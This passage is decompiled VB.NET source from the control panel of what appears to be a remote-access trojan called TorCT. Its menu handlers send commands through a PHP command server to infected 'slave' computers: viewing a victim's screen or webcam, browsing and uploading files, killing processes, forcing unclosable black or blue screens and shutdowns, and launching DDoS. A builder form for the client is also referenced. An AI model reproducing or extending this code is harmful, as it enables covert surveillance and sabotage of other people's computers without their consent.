                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub SelectAllSlavesToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.SelectedV.Text = "All Slaves"
            If (Me.CS <> "") Then
                Me.Strvictem = ("&SpecialUser=False&Pass=" & Me.CS.ToString)
            Else
                Me.Strvictem = "&SpecialUser=False"
            End If
            Me.ExtrainfoLabel.Text = "[XX] - ALL Selected    Computer Name : ALL Selected    AntiVirus : ALL Selected     OS : ALL Selected"
            Me.PictureBox1.BackgroundImage = Resources.Unknown
        End Sub

        Private Sub ShowClientLogsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim size As Size
            If Me.ShowClientLogsToolStripMenuItem.Text.Contains("Show") Then
                size = New Size(&H107, &HF5)
                Me.Panel6.Size = size
                Me.ShowClientLogsToolStripMenuItem.Text = "Hide Client Logs"
                Me.Timer3.Start
                Try 
                    Dim str As String = Strings.Replace(Me.SendCommand.DownloadString((Me.HostName.ToString & "/log.txt")), "|-|", ChrW(13) & ChrW(10), 1, -1, CompareMethod.Binary)
                    Me.RichTextBox1.Text = str
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError
                End Try
            Else
                size = New Size(0, 0)
                Me.Panel6.Size = size
                Me.ShowClientLogsToolStripMenuItem.Text = "Show Client Logs"
                Me.Timer3.Stop
            End If
        End Sub

        Private Sub ShowImageToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.ShowImageScreen.Show
        End Sub

        Private Sub ShutdownComputerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=ShutdownPC747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub SOnline_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub StartWebsiteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.InputVlaue = Interaction.InputBox("Please Fill In The website" & ChrW(13) & ChrW(10) & "Please make sure the addres is correct!", "Website", "http://www.", -1, -1)
            If Me.InputVlaue.Contains("http://www.") Then
                Interaction.MsgBox(Me.InputVlaue, MsgBoxStyle.ApplicationModal, Nothing)
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=Website747:" & Me.InputVlaue.ToString & Me.Strvictem.ToString))
            Else
                Interaction.MsgBox("Please make sure It contains http://www.", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub TalkComputerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.InputVlaue = Interaction.InputBox("Please Fill In The Text To talk", "Talk Computer", "", -1, -1)
            If (Me.InputVlaue = "") Then
                Interaction.MsgBox("Please Fill somthing in!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=TALK747:" & Me.InputVlaue.ToString & Me.Strvictem.ToString))
                Interaction.MsgBox(Me.InputVlaue, MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.RefreshSlaves < 20) Then
                Me.SOnline.Text = (Conversions.ToString(CDbl((5 * Me.RefreshSlaves))).ToString & " % : Online Slaves")
                Me.RefreshSlaves += 1
            Else
                Me.CheckOnline
                Me.RefreshSlaves = 0
                Me.Timer2.Stop
                If (Me.RefreshSlaves > 14) Then
                    Me.CheckOnline
                    Me.RefreshSlaves = 0
                    Me.Timer2.Stop
                End If
            End If
        End Sub

        Private Sub Timer1_Tick_1(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.HostName <> "") Then
                Try 
                    If (Me.a.ToString <> Me.CheckSlaves.DownloadString((Me.HostName.ToString & "/Slaves.txt")).ToString) Then
                        Me.CheckOnline
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError
                End Try
            End If
        End Sub

        Private Sub Timer3_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str As String = Strings.Replace(Me.SendCommand.DownloadString((Me.HostName.ToString & "/log.txt")), "|-|", ChrW(13) & ChrW(10), 1, -1, CompareMethod.Binary)
                Me.RichTextBox1.Text = str
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub TutorialsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Process.Start("http://www.torct.eu/index.php?/topic/5-tutorial-setup-client-server/")
        End Sub

        Private Sub UDPToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                MyProject.Forms.UdpForum.Show
            Else
                Interaction.MsgBox("It would be much more effective if you selected all your Slaves!", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub UnclosebleBlackScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=BlackScreenNC747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub UnclosebleBlueScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=BlueScreenNC747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub UpdToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.CreateServer.Show
        End Sub

        Private Sub UploadFileToSlaveToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.UploadFileTo.Show
        End Sub

        Private Sub VieuwScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Try 
                    Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=ViewScreen747" & Me.Strvictem.ToString))
                    Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                    MyProject.Forms.WebOrScreenCapture.Show
                    Me.WitchViewSW = Conversions.ToInteger("1")
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            End If
        End Sub

        Private Sub VieuwWebcamToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Try 
                    Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=ShowWebcam747" & Me.Strvictem.ToString))
                    Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                    MyProject.Forms.WebOrScreenCapture.Show
                    Me.WitchViewSW = Conversions.ToInteger("2")
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            End If
        End Sub

        Private Sub ViewSlaveFilesToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                MyProject.Forms.FileBrowser.Show
            End If
        End Sub


        ' Properties
        Friend Overridable Property BlackScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._BlackScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.BlackScreenToolStripMenuItem_Click)
                If (Not Me._BlackScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._BlackScreenToolStripMenuItem.Click, handler
                End If
                Me._BlackScreenToolStripMenuItem = WithEventsValue
                If (Not Me._BlackScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._BlackScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property BlueScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._BlueScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.BlueScreenToolStripMenuItem_Click)
                If (Not Me._BlueScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._BlueScreenToolStripMenuItem.Click, handler
                End If
                Me._BlueScreenToolStripMenuItem = WithEventsValue
                If (Not Me._BlueScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._BlueScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ClientPasswordhostToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ClientPasswordhostToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ClientPasswordhostToolStripMenuItem_Click)
                If (Not Me._ClientPasswordhostToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ClientPasswordhostToolStripMenuItem.Click, handler
                End If
                Me._ClientPasswordhostToolStripMenuItem = WithEventsValue
                If (Not Me._ClientPasswordhostToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ClientPasswordhostToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ClientSettingsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ClientSettingsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._ClientSettingsToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ClientSettingsToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ClientSettingsToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ClientSettingsToolStripMenuItem1_Click)
                If (Not Me._ClientSettingsToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._ClientSettingsToolStripMenuItem1.Click, handler
                End If
                Me._ClientSettingsToolStripMenuItem1 = WithEventsValue
                If (Not Me._ClientSettingsToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._ClientSettingsToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ColoredScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ColoredScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ColoredScreenToolStripMenuItem_Click)
                If (Not Me._ColoredScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ColoredScreenToolStripMenuItem.Click, handler
                End If
                Me._ColoredScreenToolStripMenuItem = WithEventsValue
                If (Not Me._ColoredScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ColoredScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ColumnHeader1 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader2 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader3 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader4 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader4 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader5 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader5 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader6 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader6 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader7 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader7 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ColumnHeader8 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ColumnHeader)
                Me._ColumnHeader8 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ComputerManegerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ComputerManegerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._ComputerManegerToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Conected As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Conected
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Conected_Click)
                If (Not Me._Conected Is Nothing) Then
                    RemoveHandler Me._Conected.Click, handler
                End If
                Me._Conected = WithEventsValue
                If (Not Me._Conected Is Nothing) Then
                    AddHandler Me._Conected.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._ContextMenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ContextMenuStrip)
                Me._ContextMenuStrip1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property CrashComputerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CrashComputerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CrashComputerToolStripMenuItem_Click)
                If (Not Me._CrashComputerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CrashComputerToolStripMenuItem.Click, handler
                End If
                Me._CrashComputerToolStripMenuItem = WithEventsValue
                If (Not Me._CrashComputerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CrashComputerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CreditsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CreditsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CreditsToolStripMenuItem_Click)
                If (Not Me._CreditsToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CreditsToolStripMenuItem.Click, handler
                End If
                Me._CreditsToolStripMenuItem = WithEventsValue
                If (Not Me._CreditsToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CreditsToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DdoSToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DdoSToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._DdoSToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property DeliteAllToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DeliteAllToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DeliteAllToolStripMenuItem_Click)
                If (Not Me._DeliteAllToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DeliteAllToolStripMenuItem.Click, handler
                End If
                Me._DeliteAllToolStripMenuItem = WithEventsValue
                If (Not Me._DeliteAllToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DeliteAllToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DeliteSlaveToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DeliteSlaveToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DeliteSlaveToolStripMenuItem_Click)
                If (Not Me._DeliteSlaveToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DeliteSlaveToolStripMenuItem.Click, handler
                End If
                Me._DeliteSlaveToolStripMenuItem = WithEventsValue
                If (Not Me._DeliteSlaveToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DeliteSlaveToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DonatePaypallToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DonatePaypallToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DonatePaypallToolStripMenuItem_Click)
                If (Not Me._DonatePaypallToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DonatePaypallToolStripMenuItem.Click, handler
                End If
                Me._DonatePaypallToolStripMenuItem = WithEventsValue
                If (Not Me._DonatePaypallToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DonatePaypallToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ExtrainfoLabel As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._ExtrainfoLabel
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._ExtrainfoLabel = WithEventsValue
            End Set
        End Property

        Friend Overridable Property FilesToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._FilesToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._FilesToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property FunThingsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._FunThingsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._FunThingsToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property GetActiveWindowToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._GetActiveWindowToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.GetActiveWindowToolStripMenuItem_Click)
                If (Not Me._GetActiveWindowToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._GetActiveWindowToolStripMenuItem.Click, handler
                End If
                Me._GetActiveWindowToolStripMenuItem = WithEventsValue
                If (Not Me._GetActiveWindowToolStripMenuItem Is Nothing) Then
                    AddHandler Me._GetActiveWindowToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property GetProceToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._GetProceToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.GetProceToolStripMenuItem_Click)
                If (Not Me._GetProceToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._GetProceToolStripMenuItem.Click, handler
                End If
                Me._GetProceToolStripMenuItem = WithEventsValue
                If (Not Me._GetProceToolStripMenuItem Is Nothing) Then
                    AddHandler Me._GetProceToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property HelpTorCTToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._HelpTorCTToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._HelpTorCTToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property HostText As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._HostText
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._HostText = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ImageList1 As ImageList
            <DebuggerNonUserCode> _
            Get
                Return Me._ImageList1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ImageList)
                Me._ImageList1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property KillProcessToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._KillProcessToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._KillProcessToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property KillProcessToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._KillProcessToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.KillProcessToolStripMenuItem1_Click)
                If (Not Me._KillProcessToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._KillProcessToolStripMenuItem1.Click, handler
                End If
                Me._KillProcessToolStripMenuItem1 = WithEventsValue
                If (Not Me._KillProcessToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._KillProcessToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Label1_Click)
                If (Not Me._Label1 Is Nothing) Then
                    RemoveHandler Me._Label1.Click, handler
                End If
                Me._Label1 = WithEventsValue
                If (Not Me._Label1 Is Nothing) Then
                    AddHandler Me._Label1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ListView1 As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._ListView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ListView)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ListView1_SelectedIndexChanged)
                If (Not Me._ListView1 Is Nothing) Then
                    RemoveHandler Me._ListView1.SelectedIndexChanged, handler
                End If
                Me._ListView1 = WithEventsValue
                If (Not Me._ListView1 Is Nothing) Then
                    AddHandler Me._ListView1.SelectedIndexChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property MenuStrip1 As MenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._MenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As MenuStrip)
                Dim handler As ToolStripItemClickedEventHandler = New ToolStripItemClickedEventHandler(AddressOf Me.MenuStrip1_ItemClicked)
                If (Not Me._MenuStrip1 Is Nothing) Then
                    RemoveHandler Me._MenuStrip1.ItemClicked, handler
                End If
                Me._MenuStrip1 = WithEventsValue
                If (Not Me._MenuStrip1 Is Nothing) Then
                    AddHandler Me._MenuStrip1.ItemClicked, handler
                End If
            End Set
        End Property

        Friend Overridable Property MsgboxToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._MsgboxToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MsgboxToolStripMenuItem_Click)
                If (Not Me._MsgboxToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._MsgboxToolStripMenuItem.Click, handler
                End If
                Me._MsgboxToolStripMenuItem = WithEventsValue
                If (Not Me._MsgboxToolStripMenuItem Is Nothing) Then
                    AddHandler Me._MsgboxToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenAdflyLinksGoogleToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OpenAdflyLinksGoogleToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenAdflyLinksGoogleToolStripMenuItem_Click)
                If (Not Me._OpenAdflyLinksGoogleToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenAdflyLinksGoogleToolStripMenuItem.Click, handler
                End If
                Me._OpenAdflyLinksGoogleToolStripMenuItem = WithEventsValue
                If (Not Me._OpenAdflyLinksGoogleToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenAdflyLinksGoogleToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenAdflyToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
